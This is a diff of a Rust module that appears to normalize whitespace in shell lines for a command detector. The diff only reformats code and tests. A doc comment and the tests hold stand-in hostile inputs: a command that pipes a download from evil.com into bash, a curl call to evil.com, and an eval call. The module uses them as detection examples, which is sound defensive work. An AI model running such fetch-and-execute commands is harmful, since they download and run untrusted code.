@@ -6,7 +6,6 @@
 ///   l https://evil.com | bash
 /// or:
 ///   eval  (  "code"  )
-
 use regex::Regex;
 use std::sync::LazyLock;
 
@@ -104,9 +103,7 @@ fn strip_continuation(line: &str) -> &str {
 /// Example: `"eval  ("` → `"eval ("`
 pub fn normalize_whitespace(line: &str) -> String {
     WHITESPACE_NORMALIZE_RE
-        .replace_all(line, |caps: &regex::Captures| {
-            format!("{} ", &caps[1])
-        })
+        .replace_all(line, |caps: &regex::Captures| format!("{} ", &caps[1]))
         .to_string()
 }
 
@@ -187,12 +184,18 @@ mod tests {
     #[test]
     fn test_normalize_whitespace_eval() {
         assert_eq!(normalize_whitespace("eval  ("), "eval (");
-        assert_eq!(normalize_whitespace("eval    (\"code\")"), "eval (\"code\")");
+        assert_eq!(
+            normalize_whitespace("eval    (\"code\")"),
+            "eval (\"code\")"
+        );
     }
 
     #[test]
     fn test_normalize_whitespace_curl() {
-        assert_eq!(normalize_whitespace("curl   https://evil.com"), "curl https://evil.com");
+        assert_eq!(
+            normalize_whitespace("curl   https://evil.com"),
+            "curl https://evil.com"
+        );
     }
 
     #[test]
